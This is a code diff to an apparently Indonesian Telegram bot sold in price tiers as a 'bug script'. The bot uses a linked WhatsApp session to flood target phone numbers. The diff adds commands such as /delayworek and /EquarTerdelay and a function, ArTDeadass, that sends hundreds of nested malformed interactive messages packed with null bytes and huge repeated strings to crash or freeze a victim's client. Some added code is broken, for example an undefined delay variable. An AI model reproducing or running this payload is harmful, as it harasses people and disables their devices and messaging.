@@ -1083,14 +1083,13 @@ async function sendHome(ctx) {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
@@ -1112,20 +1111,20 @@ bot.action("xsettings", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡</blockquote>
+╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
+
 ◇ /update          
 ◇ /connect
 ◇ /addprem
@@ -1146,6 +1145,7 @@ bot.action("xsettings", async (ctx) => {
 ◇ /runtime
 ◇ /mode
 ◇ /cekowner
+</pre>
 `;
 
   await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
@@ -1158,25 +1158,25 @@ bot.action("xbugs", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡</blockquote>
+╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
 ◇ /specterdelay 
-◇ /delayworek_v1
-
-<blockquote>╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡</blockquote>
+◇ /delayworek
+◇ /EquarTerdelay
+╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
 ◇ /attack
+</pre>
 `;
 
   await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
@@ -1189,26 +1189,27 @@ bot.action("tools", async (ctx) => {
   const sender = isWhatsAppConnected;   
 
   const caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐓𝐎𝐎𝐋𝐒 』───═⬡</blockquote>            
+╭═───⊱『 𝐓𝐎𝐎𝐋𝐒 』───═⬡
+              
 ◇ /brat
 ◇ /tiktokdl
 ◇ /convert
 ◇ /waktu
 ◇ /ssiphone
 ◇ /cekidch
+</pre>
 `;
 
   await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
@@ -1229,20 +1230,19 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 1) {
     caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 』───═⬡</blockquote>
+╭═───⊱『 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 』───═⬡
               
 ◇40K FULL UP SCRIPT
 ◇50K RESELLER SCRIPT
@@ -1250,6 +1250,7 @@ async function showInfo(ctx, page = 1) {
 ◇75K MODERATOR SCRIPT
 ◇90K CEO SCRIPT
 ◇110K OWNER SCRIPT
+</pre>
 `;
 
     keyboard = [
@@ -1265,21 +1266,21 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 2) {
     caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 』───═⬡</blockquote>
+╭═───⊱『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 』───═⬡
  olaa saya Bawzhhh ingin memberitahu bahwa script ini adalah karya milik saya, saya berterimakasih kalian sudah memakai script bug ini walaupun ampas yakh hehe, titik bahagia seseorang adalah ketika karyanya di gunakan tanpa adanya rasa terpaksa tapi dengan hati yang tulus Terimakasih 
+</pre>
 `;
 
     keyboard = [
@@ -2146,27 +2147,44 @@ bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx
   })();
 
 });
-/// ============= CASE BUG 2 BEBAS SPAM=============\\\
-bot.command("delayworek_v1", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
-
+/// CASE BUG BEBAS SPAM 2/// 
+bot.command("delayworek", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+ 
   const q = ctx.message.text.split(" ")[1]; 
-  if (!q) return ctx.reply("🪧 ☇ Example : /specterdelay 62xx");
+  if (!q) return ctx.reply("🪧 ☇ Example : /delayworek 62xx");
 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-  await ctx.reply(`✅ delayworek_v1 (bug) selesai untuk ${q}`);
+  await ctx.reply(`✅ delayworek (bug) selesai untuk ${q}`);
 
   (async () => {
-    for (let r = 0; r < 30; r++) {
+    for (let r = 0; r < 40; r++) {
   await DelayNewVnX(sock, target);
-  await sleep(4000);
 }
   })();
 
 });
-/// CASE BUG 3///
-bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+/// ============= CASE BUG 3 BEBAS SPAM=============\\\
+bot.command("EquarTerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /EquarTerdelay 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.reply(`✅ EquarTerdelay (bug) terkirim untuk ${q}`);
+
+  (async () => {
+    for (let z = 0; z < 700; z++) {
+  await ArTDeadass(sock, target);
+  await sleep(1000);
+}
+  })();
+
+});
+/// CASE BUG 10///
+bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+  try {
     const q = ctx.message?.text?.split(" ")[1];
     if (!q) return ctx.reply("🪧 ☇ Example : /Xtest 62xx");
 
@@ -2259,6 +2277,105 @@ async function DelayNewVnX(sock, target) {
    };
            
   await sock.relayMessage(target, vnxnew, {});
+}
+
+async function ArTDeadass(sock, target) {
+  for (let z = 0; z < 700; z++) {
+    const jut = {
+      ephemeralMessage: {
+        message: {
+          groupStatusMessageV2: {
+            message: {
+              viewOnceMessage: {
+                message: {
+                  interactiveMessage: {
+                    body: {
+                      text: "ArT - Deadass"
+                    },
+                    nativeFlowMessage: {
+                      buttons: [
+                        { name: "\u0000\u0000\u0000", buttonParamsJson: "\u0000" },
+                        { name: "single_select\u0000", buttonParamsJson: "{\u0000}" },
+                        { name: "\x00\x00", buttonParamsJson: "\x00".repeat(198776) }
+                      ]
+                    },
+                    nativeFlowResponseMessage: {
+                      name: "address_message",
+                      paramsJson: JSON.stringify({
+                        flow_cta: "\u0000".repeat(2),
+                        extra_data: {
+                          address: {
+                            in_pin_code: "999999",
+                            building_name: "\u0000".repeat(198776),
+                            landmark_area: "18+",
+                            address: "london",
+                            tower_number: "italia",
+                            city: "florida",
+                            name: "artillery".repeat(198776),
+                            phone_number: "999999999999",
+                            house_number: "13135550002",
+                            floor_number: "@3135550202",
+                            state: "X" + "\u0000".repeat(99987)
+                          },
+                          menu: {
+                            display_text: "\u0000".repeat(198776),
+                            description: "\u0000".repeat(198776),
+                            id: "artillery"
+                          },
+                          payment: {
+                            flow_cta: "{".repeat(99876)
+                          }
+                        }
+                      }),
+                      version: 3
+                    },
+                    contextInfo: {
+                      businessMessageForwardInfo: {
+                        businessOwnerJid: "0@s.whatsapp.net"
+                      },
+                      isForwarded: true,
+                      forwardingScore: 999,
+                      quotedMessage: {
+                        conversation: "ArT - Deadass"
+                      },
+                      stanzaId: "BAE5" + Math.random().toString(16).slice(2),
+                      participant: target,
+                      remoteJid: target
+                    },
+                    header: {
+                      hasMediaAttachment: true,
+                      locationMessage: {
+                        degreesLatitude: 21.1266,
+                        degreesLongitude: -11.8199,
+                        name: `#ArTDeadass¡` + "????".repeat(1),
+                        jpegThumbnail: null,
+                        contextInfo: {
+                          externalAdReply: {
+                            quotedAd: {
+                              advertiserName: "????".repeat(198776),
+                              mediaType: "IMAGE",
+                              jpegThumbnail: null,
+                              caption: "????".repeat(198776)
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage(target, jut, {
+      participant: { jid: target }
+    });
+
+    await new Promise(res => setTimeout(res, delay));
+  }
 }
 
 // --- Jalankan Bot --- //
